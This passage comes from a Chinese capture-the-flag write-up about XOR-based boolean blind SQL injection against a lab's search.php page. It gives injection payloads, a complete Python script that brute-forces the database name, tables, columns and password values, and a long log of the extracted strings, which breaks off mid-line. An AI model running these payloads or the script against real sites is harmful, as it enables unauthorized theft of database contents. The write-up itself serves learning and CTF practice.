class="line">这俩数据，是我们进行爆破的核心关键所在。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>根据上面的回显的字符串，我们尝试做下异或注入，也称作布尔注入，布尔盲注。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 大括号的意思是包含了某个值，大括号的具体内容看下面脚本就行了</span><br><span class="line"># 尝试测测库长度，直接测出来了</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">^</span>(length(database())); </span><br><span class="line"><span class="comment">-- 得到的值等价于4，说明数据库的名字是四位的</span></span><br><span class="line"></span><br><span class="line"># 尝试爆库名</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">^</span>(ascii(<span class="built_in">SUBSTRING</span>(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">103</span>);</span><br><span class="line"><span class="comment">-- 分别爆出的：103，101，101，107 =&gt; geek</span></span><br><span class="line"></span><br><span class="line"># 尝试爆列爆表</span><br><span class="line"># 爆表名长度</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">^</span>((<span class="keyword">SELECT</span>(length(GROUP_CONCAT(table_name)))<span class="keyword">FROM</span>(information_schema.tables)<span class="keyword">where</span>(table_schema<span class="operator">=</span>database()))<span class="operator">=</span><span class="number">16</span>)</span><br><span class="line"><span class="comment">-- 得到的是16</span></span><br><span class="line"></span><br><span class="line">#爆破表名</span><br><span class="line">#一个是上面获取的字符串长度轮换变化，一个是<span class="number">0</span>到<span class="number">128</span>的ascii码的十进制数字变化</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">^</span>((<span class="keyword">SELECT</span>(ascii(<span class="built_in">SUBSTRING</span>(GROUP_CONCAT(table_name),&#123;&#125;,<span class="number">1</span>)))<span class="keyword">FROM</span>(information_schema.tables)<span class="keyword">where</span>(table_schema<span class="operator">=</span>database()))<span class="operator">=</span>&#123;&#125;)</span><br><span class="line"><span class="comment">-- 爆出来的是： F1naI1y,Flaaaaag</span></span><br><span class="line"></span><br><span class="line"># 尝试根据Flaaaaag表名爆列值</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">^</span>((<span class="keyword">SELECT</span>(ord(<span class="built_in">SUBSTRING</span>(GROUP_CONCAT(column_name),&#123;&#125;,<span class="number">1</span>)))<span class="keyword">FROM</span>(information_schema.columns)<span class="keyword">where</span>(table_name<span class="operator">=</span>&quot;Flaaaaag&quot;))<span class="operator">=</span>&#123;&#125;);</span><br><span class="line"><span class="comment">-- 得到id,fl4gawsl</span></span><br><span class="line"># 尝试爆列值</span><br><span class="line"><span class="comment">-- 这个爆列值就算了，就是个报错集中表，就是那些id=1到id=6的存放表</span></span><br><span class="line"><span class="comment">-- 暂时排除此处存在flag的情况</span></span><br><span class="line"></span><br><span class="line"># 尝试爆破另外一个表F1naI1y</span><br><span class="line"># 爆列名</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">^</span>((<span class="keyword">SELECT</span>(ord(<span class="built_in">SUBSTRING</span>(GROUP_CONCAT(column_name),&#123;&#125;,<span class="number">1</span>)))<span class="keyword">FROM</span>(information_schema.columns)<span class="keyword">where</span>(table_name<span class="operator">=</span>&quot;F1naI1y&quot;))<span class="operator">=</span>&#123;&#125;);</span><br><span class="line"><span class="comment">-- 爆出来的列是id,username,password</span></span><br><span class="line"># 用户名爆不出东西，尝试爆破密码</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">^</span>((<span class="keyword">select</span>(ord(<span class="built_in">SUBSTRING</span>(GROUP_CONCAT(password),&#123;&#125;,<span class="number">1</span>)))<span class="keyword">from</span>(geek.F1naI1y))<span class="operator">=</span>&#123;&#125;);</span><br><span class="line"><span class="comment">-- 这爆破实在是久得离谱……</span></span><br><span class="line"><span class="comment">-- 用上了ascii码，并且排除了特殊字符，就那么慢慢爆破</span></span><br><span class="line"><span class="comment">-- 这个时候就能暂时放下手中的题目，先去做别的题了</span></span><br></pre></td></tr></table></figure>

<p>下面是具体的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests,re,time</span><br><span class="line"><span class="comment"># 火狐浏览器UA</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 错误提示集--短集合</span></span><br><span class="line">arr = [<span class="string">&#x27;NO!&#x27;</span>,<span class="string">&#x27;yingyingying&#x27;</span>,<span class="string">&#x27;Ohhh&#x27;</span>,<span class="string">&#x27;OK OK I&#x27;</span>,<span class="string">&#x27;You are&#x27;</span>,<span class="string">&#x27;Clever!&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 专门搞传输的模块</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_url</span>(<span class="params">url,data</span>):</span><br><span class="line">    req = requests.get(url, headers=data)</span><br><span class="line">    html_content = req.text</span><br><span class="line">    <span class="comment"># 正则表达式</span></span><br><span class="line">    pattern = <span class="string">r&quot;&lt;h1.*?&gt;(.*?)&lt;/h1&gt;&quot;</span></span><br><span class="line">    matches = re.findall(pattern, html_content)</span><br><span class="line">    <span class="keyword">return</span> matches</span><br><span class="line"></span><br><span class="line"><span class="comment"># ascii码的碰撞单元</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ascii_get</span>(<span class="params">url,url_edit,num,s</span>):</span><br><span class="line">    stt = <span class="string">&quot;&quot;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz[\]^_`&#123;|&#125;~ !&quot;#$%&amp;&#x27;()*+,-./0123456789:;&lt;=&gt;?@&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> stt:</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        urls = url + url_edit.<span class="built_in">format</span>(num + <span class="number">1</span>, <span class="built_in">ord</span>(i))</span><br><span class="line">        matches = get_url(urls, data)</span><br><span class="line">        <span class="comment"># print(matches,num+1,i,urls)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> matches == []:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;ERROR&#x27;</span> <span class="keyword">in</span> matches[<span class="number">0</span>]:</span><br><span class="line">                s += i</span><br><span class="line">                <span class="comment"># print(s)</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;414 Request-URI Too Large&#x27;</span> <span class="keyword">in</span> matches[<span class="number">0</span>]:</span><br><span class="line">                <span class="comment"># print(n, i, strs, urls)</span></span><br><span class="line">                <span class="built_in">print</span>(url)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data_len</span>(<span class="params">url,data,url_edit,n=<span class="number">1</span></span>):</span><br><span class="line">    urls = url+url_edit</span><br><span class="line">    value = get_url(urls,data)</span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> arr:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> value[<span class="number">0</span>]:</span><br><span class="line">                <span class="keyword">return</span> arr.index(i)</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">elif</span> n==<span class="number">2</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data_name</span>(<span class="params">url,url_edit,n,data_name_input</span>):</span><br><span class="line">    urls = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    data_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 根据获取的数据库名字的长度输出数据库名字</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    stt = <span class="string">&quot;&quot;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz[\]^_`&#123;|&#125;~ !&quot;#$%&amp;&#x27;()*+,-./0123456789:;&lt;=&gt;?@&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># for循环读取数据库库名</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        original = s</span><br><span class="line">        s = ascii_get(url,url_edit,num,s)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125;:&#x27;</span>.<span class="built_in">format</span>(data_name_input),s)</span><br><span class="line">        <span class="keyword">if</span> s == original:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">flag_str</span>):</span><br><span class="line">    regular_expression = <span class="string">&#x27;.*?flag&#123;(.*?)&#125;.*?&#x27;</span></span><br><span class="line">    matches = re.findall(regular_expression, flag_str)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;你需要的flag为：flag&#123;&#x27;</span>+matches+<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">url_edit</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">if</span> url[-<span class="number">1</span>] == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> url[:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="built_in">input</span>(<span class="string">&#x27;请输入一个合法的url(不需要带参数,形如：http://xxx.xxx.xxx:81)\n不正确运行出错就是你自己的事情喽:\n&#x27;</span>)</span><br><span class="line">    url = url_edit(url)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取当前数据库的名字的长度</span></span><br><span class="line">    url_edit = <span class="string">&#x27;/search.php?id=1^(length(database()));&#x27;</span></span><br><span class="line">    data_len = get_data_len(url,data,url_edit)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;数据库名字的长度：&#x27;</span>,data_len)</span><br><span class="line">    <span class="keyword">if</span> data_len == [<span class="string">&#x27;404&#x27;</span>]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;你的靶场已关闭，状态码：404&#x27;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    <span class="comment"># 获取当前数据库名</span></span><br><span class="line">    url_edit = <span class="string">&#x27;/search.php?id=1^(ord(SUBSTRING(database(),&#123;&#125;,1))=&#123;&#125;);&#x27;</span></span><br><span class="line">    data_name = get_data_name(url,url_edit,data_len,<span class="string">&#x27;数据库名&#x27;</span>)</span><br><span class="line">    <span class="comment"># 根据数据库爆表</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;即将爆破出数据库&#x27;</span>+data_name+<span class="string">&#x27;的表：&#x27;</span>)</span><br><span class="line">    url_edit = <span class="string">&#x27;/search.php?id=1^((SELECT(ord(SUBSTRING(GROUP_CONCAT(table_name),&#123;&#125;,1)))FROM(information_schema.tables)where(table_schema=database()))=&#123;&#125;);&#x27;</span></span><br><span class="line">    table_name = get_data_name(url,url_edit,<span class="number">1000</span>,<span class="string">&#x27;表名&#x27;</span>).split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="comment"># 爆列名</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;即将爆破的表：&#x27;</span>,table_name[<span class="number">0</span>])</span><br><span class="line">    url_edit = <span class="string">&#x27;/search.php?id=1^((SELECT(ord(SUBSTRING(GROUP_CONCAT(column_name),&#123;&#125;,1)))FROM(information_schema.columns)where(table_name=&quot;&#x27;</span>+table_name[<span class="number">0</span>]+<span class="string">&#x27;&quot;))=&#123;&#125;);&#x27;</span></span><br><span class="line">    column_name = get_data_name(url,url_edit,<span class="number">1000</span>,<span class="string">&#x27;列名&#x27;</span>).split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 爆值</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;即将被爆破的列：&#x27;</span>,column_name[-<span class="number">1</span>])</span><br><span class="line">    table_names = data_name + <span class="string">&#x27;.&#x27;</span> + table_name[<span class="number">0</span>]</span><br><span class="line">    url_edit = <span class="string">&#x27;/search.php?id=1^((select(ord(SUBSTRING(GROUP_CONCAT(&#x27;</span>+ column_name[-<span class="number">1</span>] +<span class="string">&#x27;),&#123;&#125;,1)))from(&#x27;</span>+table_names+<span class="string">&#x27;))=&#123;&#125;);&#x27;</span></span><br><span class="line">    list_val = get_data_name(url,url_edit,<span class="number">1000</span>,<span class="string">&#x27;列值&#x27;</span>)</span><br><span class="line">    get_flag(list_val)</span><br></pre></td></tr></table></figure>

<p>下面是爆破的结果，十分的长。</p>
<p>满打满算，也就跑了快一个小时吧。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">数据库名字的长度： 4</span><br><span class="line">数据库名: g</span><br><span class="line">数据库名: ge</span><br><span class="line">数据库名: gee</span><br><span class="line">数据库名: geek</span><br><span class="line">即将爆破出数据库geek的表：</span><br><span class="line">表名: F</span><br><span class="line">表名: F1</span><br><span class="line">表名: F1n</span><br><span class="line">表名: F1na</span><br><span class="line">表名: F1naI</span><br><span class="line">表名: F1naI1</span><br><span class="line">表名: F1naI1y</span><br><span class="line">表名: F1naI1y,</span><br><span class="line">表名: F1naI1y,F</span><br><span class="line">表名: F1naI1y,Fl</span><br><span class="line">表名: F1naI1y,Fla</span><br><span class="line">表名: F1naI1y,Flaa</span><br><span class="line">表名: F1naI1y,Flaaa</span><br><span class="line">表名: F1naI1y,Flaaaa</span><br><span class="line">表名: F1naI1y,Flaaaaa</span><br><span class="line">表名: F1naI1y,Flaaaaag</span><br><span class="line">表名: F1naI1y,Flaaaaag</span><br><span class="line">即将爆破的表： F1naI1y</span><br><span class="line">列名: i</span><br><span class="line">列名: <span class="built_in">id</span></span><br><span class="line">列名: <span class="built_in">id</span>,</span><br><span class="line">列名: <span class="built_in">id</span>,u</span><br><span class="line">列名: <span class="built_in">id</span>,us</span><br><span class="line">列名: <span class="built_in">id</span>,use</span><br><span class="line">列名: <span class="built_in">id</span>,user</span><br><span class="line">列名: <span class="built_in">id</span>,usern</span><br><span class="line">列名: <span class="built_in">id</span>,userna</span><br><span class="line">列名: <span class="built_in">id</span>,usernam</span><br><span class="line">列名: <span class="built_in">id</span>,username</span><br><span class="line">列名: <span class="built_in">id</span>,username,</span><br><span class="line">列名: <span class="built_in">id</span>,username,p</span><br><span class="line">列名: <span class="built_in">id</span>,username,pa</span><br><span class="line">列名: <span class="built_in">id</span>,username,pas</span><br><span class="line">列名: <span class="built_in">id</span>,username,pass</span><br><span class="line">列名: <span class="built_in">id</span>,username,passw</span><br><span class="line">列名: <span class="built_in">id</span>,username,passwo</span><br><span class="line">列名: <span class="built_in">id</span>,username,passwor</span><br><span class="line">列名: <span class="built_in">id</span>,username,password</span><br><span class="line">列名: <span class="built_in">id</span>,username,password</span><br><span class="line">即将被爆破的列： password</span><br><span class="line">列值: c</span><br><span class="line">列值: cl</span><br><span class="line">列值: cl4</span><br><span class="line">列值: cl4y</span><br><span class="line">列值: cl4y_</span><br><span class="line">列值: cl4y_i</span><br><span class="line">列值: cl4y_is</span><br><span class="line">列值: cl4y_is_</span><br><span class="line">列值: cl4y_is_r</span><br><span class="line">列值: cl4y_is_re</span><br><span class="line">列值: cl4y_is_rea</span><br><span class="line">列值: cl4y_is_real</span><br><span class="line">列值: cl4y_is_reall</span><br><span class="line">列值: cl4y_is_really</span><br><span class="line">列值: cl4y_is_really_</span><br><span class="line">列值: cl4y_is_really_a</span><br><span class="line">列值: cl4y_is_really_am</span><br><span class="line">列值: cl4y_is_really_ama</span><br><span class="line">列值: cl4y_is_really_amaz</span><br><span class="line">列值: cl4y_is_really_amazi</span><br><span class="line">列值: cl4y_is_really_amazin</span><br><span class="line">列值: cl4y_is_really_amazing</span><br><span class="line">列值: cl4y_is_really_amazing,</span><br><span class="line">列值: cl4y_is_really_amazing,w</span><br><span class="line">列值: cl4y_is_really_amazing,we</span><br><span class="line">列值: cl4y_is_really_amazing,wel</span><br><span class="line">列值: cl4y_is_really_amazing,welc</span><br><span class="line">列值: cl4y_is_really_amazing,welco</span><br><span class="line">列值: cl4y_is_really_amazing,welcom</span><br><span class="line">列值: cl4y_is_really_amazing,welcome</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_t</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_m</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_b</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_bl</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blo</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,h</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,ht</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,htt</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http:</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http:/</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://w</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://ww</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.c</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.t</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.to</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,h</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,ht</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,htt</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http:</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http:/</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://w</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://ww</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.c</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.t</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.to</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,h</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,ht</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,htt</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http:</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http:/</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://w</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://ww</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.c</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.t</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.to</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,h</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,ht</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,htt</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http:</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http:/</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://w</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://ww</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.c</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.t</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.to</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,w</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,we</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,wel</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welc</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welco</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_t</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_S</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Sy</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syc</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Sycl</span><br><span class="line">列值: cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclo</span><br><span 